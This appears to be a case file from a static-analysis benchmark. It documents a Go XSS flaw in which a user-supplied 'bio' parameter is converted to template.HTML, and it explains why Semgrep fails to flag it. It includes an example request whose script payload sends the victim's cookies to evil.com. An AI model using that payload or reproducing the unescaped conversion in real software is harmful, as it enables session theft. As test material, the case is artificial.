# Case 20: Template Injection via template.HTML Type Conversion

**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

## Vulnerability

User-controlled `bio` query parameter is cast to `template.HTML(bio)`, which tells Go's `html/template` package to treat the string as pre-sanitized HTML. The auto-escaping that normally protects against XSS is explicitly bypassed. An attacker requests:

```
/profile?user=alice&bio=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
```

The script executes in the victim's browser. Note that `Title` is safe — it remains a `string` type and gets auto-escaped.

## Why Semgrep Misses It

Semgrep's Go XSS rules focus on `template.New().Parse()` with user input in the template string itself (server-side template injection) or on direct `w.Write([]byte(userInput))` without escaping. The `template.HTML()` type conversion is a subtler pattern:

1. The template itself is static and safe — no user input in the template definition
2. The data is passed through `tmpl.Execute(w, data)` which normally auto-escapes
3. The bypass happens via the **type system** — `template.HTML` is a named `string` type that `html/template` trusts as pre-escaped

Semgrep's pattern matching sees `template.HTML(bio)` as a type conversion, not as a security-relevant sink. Rules would need to understand that converting tainted data to `template.HTML` disables the framework's built-in protection.

## Detection Requirements

- `template.HTML()` type conversion modeled as an escaping bypass / XSS sink
- Taint tracking from HTTP request parameters to the type conversion call
- Understanding that `template.HTML` values skip auto-escaping in `html/template`
